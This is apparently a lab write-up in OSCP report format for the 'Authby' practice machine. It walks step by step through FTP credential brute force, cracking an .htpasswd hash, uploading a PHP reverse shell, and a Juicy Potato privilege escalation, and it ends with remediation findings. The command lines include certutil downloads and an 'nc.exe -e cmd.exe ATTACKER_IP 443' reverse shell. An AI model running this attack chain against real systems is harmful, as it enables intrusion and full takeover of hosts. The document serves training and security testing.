# PG Practice Authby - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-4-16

---

## 0. Lesson Learned

Remember to list all files with `ls -lah`.

Remember to check all ports `nmap -p- -sC -sV...`

---

## 1. Executive Summary

An external penetration test was conducted against the target system Authby.
The assessment identified multiple critical vulnerabilities, including weak FTP credentials, exposed sensitive files, and privilege escalation via Juicy Potato.

Successful exploitation resulted in full system compromise, including administrative access.

---

## 2. Scope

- **Target:** 192.168.160.46
- **Environment:** PG Practice Authby
- **Testing Window:** 2026-4-13 to 2026-4-16
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP-port scan was run with Nmap:

Command:

```
nmap -p- -sC -sV 192.168.160.46 -T4 -oA authby_tcp
```

Output (relevant):

```
21/tcp   open  ftp     zFTPServer 6.0
242/tcp  open  http    Apache httpd
3145/tcp open  zftp-admin
3389/tcp open  ms-wbt-server
```

Interpretation:

Multiple services were exposed, including FTP, HTTP, and RDP. The presence of a non-standard HTTP port (242) and FTP service suggested potential attack vectors.

---

## 5. Enumeration

### FTP Enumeration

Command:

```
nmap -p 21 --script ftp-anon 192.168.160.46
```

Output:

```
Anonymous FTP login allowed
```

Interpretation:

Anonymous access was enabled, indicating potential misconfiguration.

### Attempted FTP Access

Command:

```
ftp 192.168.133.46
```

Output:

```
Login successful (anonymous)
Directory listing accessible
File download/upload restricted
```

Interpretation:

Anonymous users could enumerate directories but not retrieve files.

### Credential Discovery

Brute force attack was performed against FTP.

Command:

```
nmap -p 21 --script ftp-brute 192.168.160.46
```

Output:

```
admin:admin - Valid credentials
```

Interpretation:

Weak credentials allowed authenticated FTP access.

### Sensitive File Discovery

Command:

```
cat .htpasswd
```

Output:

```
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
```

Interpretation:

A hashed credential was discovered, indicating improper storage of sensitive authentication data.

### Hash Cracking

Command:

```
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 offsec.hash
```

Output:

```
elite
```

Interpretation:

The password for user offsec was successfully cracked.

### Web Enumeration

HTTP service identified on port 242.

Observation:

Login portal present requiring credentials.

Credentials Used:

```
offsec : elite
```

Interpretation:

Valid credentials provided access to the web application.

---

## 6. Initial Access

### Reverse Shell Upload

Command:

```
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
```

Command:

```
ftp 192.168.160.46
admin : admin
put shell.php
```

Output:
```
Upload successful
```

Interpretation:

Reverse shell successfully uploaded to the server.

### Shell Execution

Alternative shell used due to system incompatibility.

```
wget https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/refs/heads/master/src/reverse/php_reverse_shell.php -O ivanshell.php
```

Command:

```
put ivanshell.php
```

Listener:

```
nc -lvnp 443
```

Output:

```
Connection received from 192.168.160.46
```

Interpretation:

Initial foothold established as `livda\apache` user.

---

## 7. Post-Exploitation

### System Enumeration

Command:

```
whoami /priv
```

Output (relevant):

```
SeImpersonatePrivilege Enabled
```

Interpretation:

The presence of SeImpersonatePrivilege indicated potential for privilege escalation.

Command:

```
systeminfo
```

Interpretation:

System identified as:

```
Windows Server 2008 R2
```

### Exploit Suggestion

Command:

```
python wes.py systeminfo.txt -i "Elevation of Privilege" --exploits-only
```

Interpretation:

Juicy Potato identified as a viable exploit.

---

## 8. Privilege Escalation

### Exploit Execution

Transfer Binary

Command:

```
certutil -urlcache -split -f http://ATTACKER_IP/Juicy.Potato.x86.exe
```

Command:

```
certutil -urlcache -split -f http://ATTACKER_IP/nc.exe
```

Output:

```
Download successful
```

Execute Exploit

Command:

```
.\Juicy.Potato.x86.exe -l 1360 -p c:\windows\system32\cmd.exe -a "/c c:\windows\tasks\nc.exe -e cmd.exe ATTACKER_IP 443" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

Output:

```
SYSTEM shell obtained
```

Interpretation:

Privilege escalation successful via token impersonation.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\Users\apache\Desktop\local.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\proof.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Weak FTP Credentials

**Severity:** Critical

**Description:**
The FTP service allowed authentication using weak or default credentials (e.g., `admin:admin`).

**Impact:**
Attackers could gain authenticated access to the FTP service and potentially upload malicious files or access sensitive data.

**Recommendation:**
Enforce strong password policies, disable default credentials, and implement account lockout mechanisms.

### **Finding:** Anonymous FTP Access Enabled

**Severity:** Medium

**Description:**
The FTP service permitted anonymous login without authentication.

**Impact:**
Attackers could enumerate directory structures and gather sensitive information.

**Recommendation:**
Disable anonymous FTP access unless explicitly required, and restrict access to authorized users only.

### **Finding:** Sensitive Configuration File Exposure (.htpasswd)

**Severity:** High

**Description:**
A `.htpasswd` file containing hashed credentials was publicly accessible.

**Impact:**
Attackers could retrieve password hashes and perform offline cracking to gain unauthorized access.

**Recommendation:**
Restrict access to sensitive configuration files, ensure proper file permissions, and prevent exposure of authentication data.

### **Finding:** Token Impersonation Privilege Allowing SYSTEM Escalation

**Severity:** Critical

**Description:**
The system permitted exploitation of token impersonation privileges (e.g., SeImpersonatePrivilege), enabling escalation through known techniques such as Juicy Potato.

**Impact:**
Attackers could escalate privileges to SYSTEM and fully compromise the host.

**Recommendation:**
Apply security patches, restrict high-risk privileges, and ensure services run with least privilege.

### **Finding:** Insecure File Upload Mechanism via FTP

**Severity:** High

**Description:**
Authenticated FTP users were able to upload arbitrary files to a web-accessible directory.

**Impact:**
Attackers could upload web shells and achieve remote code execution.

**Recommendation:**
Validate uploaded files, restrict executable file types, and disable execution in upload directories.

---

## 11. Appendix

FTP Pentesting -
[https://hackviser.com/tactics/pentesting/services/ftp](https://hackviser.com/tactics/pentesting/services/ftp)

Ivan Sincek PHP Reverse Shell -
[https://github.com/ivan-sincek/php-reverse-shell](https://github.com/ivan-sincek/php-reverse-shell)

Juicy Potato x86 - 
[https://github.com/ivanitlearning/Juicy-Potato-x86](https://github.com/ivanitlearning/Juicy-Potato-x86)

CLSID for Juicy Potato - 
[https://github.com/ohpe/juicy-potato/tree/master/CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID)